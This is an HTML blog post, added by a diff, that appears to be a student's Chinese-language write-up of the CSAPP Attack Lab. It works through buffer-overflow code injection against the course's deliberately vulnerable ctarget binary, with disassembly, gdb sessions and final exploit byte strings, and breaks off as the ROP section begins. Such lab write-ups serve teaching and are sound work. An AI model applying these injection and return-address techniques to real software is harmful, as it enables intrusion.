@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"asterich.top","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"hide","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"appID":"QL0J44QNT0","apiKey":"a331bb2091b892c23102d024f7c3a31c","indexName":"asterich_blog","hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="这个 lab 对应的是 CSAPP 中的 3.10 节，主要是缓冲区攻击，需要对栈帧结构、gdb 有一定了解。现在开搞！">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSAPP Attack Lab">
+<meta property="og:url" content="https://asterich.top/2022/12/16/CSAPP-Attack-Lab/index.html">
+<meta property="og:site_name" content="asterich&#39;s blog">
+<meta property="og:description" content="这个 lab 对应的是 CSAPP 中的 3.10 节，主要是缓冲区攻击，需要对栈帧结构、gdb 有一定了解。现在开搞！">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://asterich.top/asterich_blog/2022/12/16/CSAPP-Attack-Lab/image/stack_frame.png">
+<meta property="og:image" content="https://asterich.top/asterich_blog/2022/12/16/CSAPP-Attack-Lab/image/rop.png">
+<meta property="og:image" content="https://asterich.top/asterich_blog/2022/12/16/CSAPP-Attack-Lab/image/%E5%B1%80%E5%BA%A7.jpg">
+<meta property="article:published_time" content="2022-12-16T14:13:20.000Z">
+<meta property="article:modified_time" content="2022-12-18T04:14:03.472Z">
+<meta property="article:author" content="asterich">
+<meta property="article:tag" content="C">
+<meta property="article:tag" content="Assembly">
+<meta property="article:tag" content="计算机体系结构">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://asterich.top/asterich_blog/2022/12/16/CSAPP-Attack-Lab/image/stack_frame.png">
+
+<link rel="canonical" href="https://asterich.top/2022/12/16/CSAPP-Attack-Lab/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>CSAPP Attack Lab | asterich's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">asterich's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container"></div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="algolia-results">
+  <div id="algolia-stats"></div>
+  <div id="algolia-hits"></div>
+  <div id="algolia-pagination" class="algolia-pagination"></div>
+</div>
+
+      
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://asterich.top/2022/12/16/CSAPP-Attack-Lab/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="asterich">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="asterich's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CSAPP Attack Lab
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-12-16 22:13:20" itemprop="dateCreated datePublished" datetime="2022-12-16T22:13:20+08:00">2022-12-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-12-18 12:14:03" itemprop="dateModified" datetime="2022-12-18T12:14:03+08:00">2022-12-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/programming/" itemprop="url" rel="index"><span itemprop="name">编程</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2022/12/16/CSAPP-Attack-Lab/" class="post-meta-item leancloud_visitors" data-flag-title="CSAPP Attack Lab" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/12/16/CSAPP-Attack-Lab/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/12/16/CSAPP-Attack-Lab/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>这个 lab 对应的是 CSAPP 中的 3.10 节，主要是缓冲区攻击，需要对栈帧结构、gdb 有一定了解。现在开搞！</p>
+<span id="more"></span>
+
+<h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>首先有个函数<code>getbuf()</code>，这个是缓冲区攻击的重点。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">getbuf</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到有个栈上的数组<code>buf[BUFFER_SIZE]</code>，还有一个<code>Gets()</code>，作用相当于著名的<code>gets()</code>。由于<code>Gets()</code>不执行缓冲区检查，我们能够借助对<code>buf</code>的读入覆盖栈上其他部分(比如返回地址)，做出一些花活，这就是缓冲区攻击的原理。</p>
+<p>在这个 lab 中，我们需要用不同方法发起缓冲区攻击，以恰当的参数调用三个函数：<code>touch1()</code>、<code>touch2()</code>、<code>touch3()</code>。这个 lab 大体提供了两种方式：代码注入、面向 return 编程(ROP)。下文会细 🔒。</p>
+<p>在开搞之前，回顾一下栈帧结构：</p>
+<img src="/asterich_blog/2022/12/16/CSAPP-Attack-Lab/image/stack_frame.png" title="栈帧结构" alt="stack_frame.png">
+
+<p>在返回时，%rsp 指向返回地址，然后将其弹出，并将程序计数器 PC 设置成这个返回地址。我们主要在这里做文章。</p>
+<p>值得注意的是，每一份作业都给了一个独一无二的 cookie，后面会用到。(我的是<code>0x59b997fa</code>)</p>
+<h2 id="第一部分-代码注入"><a href="#第一部分-代码注入" class="headerlink" title="第一部分 代码注入"></a>第一部分 代码注入</h2><p>这个是本 lab 第一部分的任务。在这一部分里，栈地址没有随机化，对于攻击来说刚刚好。这一部分对应的二进制程序是<code>./ctarget</code>。</p>
+<p>首先有个函数<code>test()</code>作为入口：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val); <span class="comment">// normal result</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>正常情况下，函数会执行到那行<code>printf</code>，而我们的任务是不让它走这条路，而是执行别的函数。</p>
+<h3 id="1-touch1"><a href="#1-touch1" class="headerlink" title="1. touch1()"></a>1. touch1()</h3><p>我们要执行的函数如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch1</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只要触发就算赢！我们直接看<code>touch1()</code>的汇编：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>touch1()</code>的地址是<code>0x4017c0</code>。</p>
+<p>接下来要决定这个地址放在哪里，所以我们看一下<code>getbuf()</code>的汇编，看看它栈空间开了多大：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	retq</span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br></pre></td></tr></table></figure>
+
+<p>开了 40 字节。因此，我们把地址放到 40~48 字节处，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">64 64 64 64 64 64 64 64 # useless bytes(5 * 8)</span><br><span class="line">64 64 64 64 64 64 64 64</span><br><span class="line">64 64 64 64 64 64 64 64</span><br><span class="line">64 64 64 64 64 64 64 64</span><br><span class="line">65 65 65 65 65 65 65 65</span><br><span class="line"></span><br><span class="line">c0 17 40 00 00 00 00 00 # address</span><br></pre></td></tr></table></figure>
+
+<p>为了查看效果，我们开一下 gdb:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b * 0x4017a8</span><br><span class="line">Breakpoint 1 at 0x4017a8: file buf.c, line 12.</span><br><span class="line">(gdb) b * 0x4017b9</span><br><span class="line">Breakpoint 2 at 0x4017b9: file buf.c, line 16.</span><br><span class="line">(gdb) run -q &lt; &lt;(./hex2raw &lt; exploit_c1.txt)</span><br><span class="line">Starting program: /home/asterich/code/labs/csapp/3-attack/ctarget -q &lt; &lt;(./hex2raw &lt; exploit_c1.txt)</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line"></span><br><span class="line">Breakpoint 1, getbuf () at buf.c:12</span><br><span class="line">12      buf.c: No such file or directory.</span><br><span class="line">(gdb) continue</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x00000000004017b9 in getbuf () at buf.c:16</span><br><span class="line">16      in buf.c</span><br><span class="line">(gdb) print /x $rsp</span><br><span class="line">$1 = 0x5561dc78</span><br><span class="line">(gdb) x/6g 0x5561dc78</span><br><span class="line">0x5561dc78:     0x6464646464646464      0x6464646464646464</span><br><span class="line">0x5561dc88:     0x6464646464646464      0x6464646464646464</span><br><span class="line">0x5561dc98:     0x6565656565656565      0x00000000004017c0</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，地址<code>(%rsp + 0x28)</code>处变成了我们的形状。接下来继续执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) stepi</span><br><span class="line">0x00000000004017bd      16      in buf.c</span><br><span class="line">(gdb) print /x *(long long *) ($rsp)</span><br><span class="line">$7 = 0x4017c0</span><br></pre></td></tr></table></figure>
+
+<p><code>ret</code>之后，%rsp 来到了我们想要的地方。继续执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) stepi</span><br><span class="line">touch1 () at visible.c:25</span><br></pre></td></tr></table></figure>
+
+<p>赢！</p>
+<h3 id="2-touch2"><a href="#2-touch2" class="headerlink" title="2. touch2()"></a>2. touch2()</h3><p><code>touch2()</code>有些不一样，它对参数有些要求：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">        fail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这要求我们注入一些代码，把我们拿到的 cookie 赋给参数 val(即寄存器%rdi)。有一条 mov 指令是肯定的，关键在于怎么先跳到注入代码再跳到<code>touch2()</code>。这里的正常做法应该是 mov 完了之后把<code>touch2()</code>的地址入栈，如下(转自<a href="">https://zhuanlan.zhihu.com/p/60724948</a>)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 &lt;cookie&gt;         # mov    &lt;cookie&gt;,%rdi</span><br><span class="line">68 ec 17 40 00            # pushq  $0x4017ec</span><br><span class="line">c3                        # retq</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">78 dc 61 55 00 00 00 00   # 注入代码的地址</span><br></pre></td></tr></table></figure>
+
+<p>然而我的做法比较逆天：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bf 97 dc 61 55            # mov $0x5561dc97, %edi</span><br><span class="line">48 83 ec 30               # sub $0x20, %rsp</span><br><span class="line">c3                        # retq</span><br><span class="line">90 90 90 90 90 90</span><br><span class="line"></span><br><span class="line">ec 17 40 00 00 00 00 00   # touch2()</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">78 dc 61 55 00 00 00 00   # 注入代码的地址</span><br></pre></td></tr></table></figure>
+
+<p>大概就是直接操控%rsp，让它直接指向<code>touch2()</code>。</p>
+<p>把 gdb 贴出来(地址<code>0x5561dc7d</code>对应的是<code>sub $0x20, %rsp</code>)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 1, getbuf () at buf.c:12</span><br><span class="line">12      in buf.c</span><br><span class="line">(gdb) continue</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x00000000004017b9 in getbuf () at buf.c:16</span><br><span class="line">16      in buf.c</span><br><span class="line">(gdb) x/6g $rsp</span><br><span class="line">0x5561dc78:     0xec834859b997fabf      0x909090909090c320</span><br><span class="line">0x5561dc88:     0x00000000004017ec      0x6464646464646464</span><br><span class="line">0x5561dc98:     0x6565656565656565      0x000000005561dc78</span><br><span class="line">(gdb) stepi</span><br><span class="line">0x00000000004017bd      16      in buf.c</span><br><span class="line">(gdb) stepi</span><br><span class="line">0x000000005561dc78 in ?? ()</span><br><span class="line">(gdb) x/6g $rsp</span><br><span class="line">0x5561dca8:     0x0000000000000000      0x0000000000401f24</span><br><span class="line">0x5561dcb8:     0x0000000000000000      0xf4f4f4f4f4f4f4f4</span><br><span class="line">0x5561dcc8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4</span><br><span class="line">(gdb) stepi</span><br><span class="line">0x000000005561dc7d in ?? ()</span><br><span class="line">(gdb) x/6g $rsp</span><br><span class="line">0x5561dca8:     0x0000000000000000      0x0000000000401f24</span><br><span class="line">0x5561dcb8:     0x0000000000000000      0xf4f4f4f4f4f4f4f4</span><br><span class="line">0x5561dcc8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4</span><br><span class="line">(gdb) stepi</span><br><span class="line">0x000000005561dc81 in ?? ()</span><br><span class="line">(gdb) x/6g $rsp</span><br><span class="line">0x5561dc88:     0x00000000004017ec      0x6464646464646464</span><br><span class="line">0x5561dc98:     0x6565656565656565      0x000000005561dc78</span><br><span class="line">0x5561dca8:     0x0000000000000000      0x0000000000401f24</span><br><span class="line">(gdb) print /x ($edi)</span><br><span class="line">$9 = 0x59b997fa</span><br><span class="line">(gdb) stepi</span><br><span class="line">touch2 (val=1505335290) at visible.c:40</span><br><span class="line">40      visible.c: No such file or directory.</span><br></pre></td></tr></table></figure>
+
+<p>也行。</p>
+<p>最终答案：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bf fa 97 b9 59 48 83 ec 20 c3 90 90 90 90 90 90 ec 17 40 00 00 00 00 00</span><br><span class="line">64 64 64 64 64 64 64 64 65 65 65 65 65 65 65 65 78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-touch3"><a href="#3-touch3" class="headerlink" title="3. touch3()"></a>3. touch3()</h3><p>看看<code>touch3()</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span> *sval)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>touch3()</code>的参数是一个字符串。在<code>touch3()</code>中，参数的字符串会和 cookie 转化成的字符串用<code>hexmatch()</code>比较，所以我们需要开两块地方，一个存放 cookie 字符串本身，一个存放字符串的地址。</p>
+<p>我们再看看<code>hexmatch()</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span> &#123;</span><br><span class="line">    <span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="type">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>显然，它可能会覆盖原先<code>getbuf()</code>缓冲区的数据，所以把它放在哪里也是需要考虑的地方。最安全的做法应该是放在原先的返回地址后面。其他的同<code>touch2()</code>。</p>
+<p>最终答案：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bf a8 dc 61 55 48 83 ec 20 c3 90 90 90 90 90 90 fa 18 40 00 00 00 00 00</span><br><span class="line">64 64 64 64 64 64 64 35 39 62 39 39 37 66 61 00 78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
+
+<h2 id="第二部分-Return-Oriented-Programming"><a href="#第二部分-Return-Oriented-Programming" class="headerlink" title="第二部分 Return-Oriented Programming"></a>第二部分 Return-Oriented Programming</h2><p>为了防止直球代码注入，人们发明出了一些解决方法，例如以下两种：</p>
+<ul>
+<li>随机化：函数的栈帧地址随机分配，每次运行都不一样</li>
+<li>栈帧被标记为不可执行的</li>
+</ul>
+<p>不幸的是，我们的新程序<code>./rtarget</code>运用了这些技术。</p>
+<p>道高一尺魔高一丈，ROP 应运而生。</p>
+<p>ROP 这种叫法很有趣，大概是在栈中连续放入一些工具(gadget)的地址，这样就能通过<code>ret</code>指令一路跳下去。给个生动形象的图：</p>
+<p><img src="/asterich_blog/2022/12/16/CSAPP-Attack-Lab/image/rop.png"></p>
+<p>gadget 一般源于二进制程序中已有的片段或者其链接的库。</p>
+<p>举个例子，看看 lab 中<code>farm.c</code>的一个函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">setval_210</span><span class="params">(<span class="type">unsigned</span> *p)</span> &#123;</span><br><span class="line">    *p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>机器码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">400f15:    c7 07 d4 48 89 c7     # movl $0xc78948d4,(%rdi)</span><br><span class="line">400f1b:    c3                    # retq</span><br></pre></td></tr></table></figure>
+
+<p>注意到里面有个序列<code>48 89 c7</code>，解码后刚好是汇编<code>movq %rax, %rdi</code>。这意味着我们找到了一个起始地址为<code>0x400f18</code>、指令为<code>movq %rax, %rdi</code>的 gadget。</p>
+<p>在接下来的任务中，我们要从<code>farm.c</code>中找 gadget，并且放到栈中适当位置。</p>
+<h3 id="1-touch2"><a href="#1-touch2" class="headerlink" title="1. touch2()"></a>1. touch2()</h3><p>这里同样要求我们触发<code>touch2()</code>并且传入正确的参数。我们对照 lab 任务书的指令编码表格，在反汇编后<code>farm.c</code>的前半部分中查找可能有用的 gadget(已经用注释标出来)：</p>
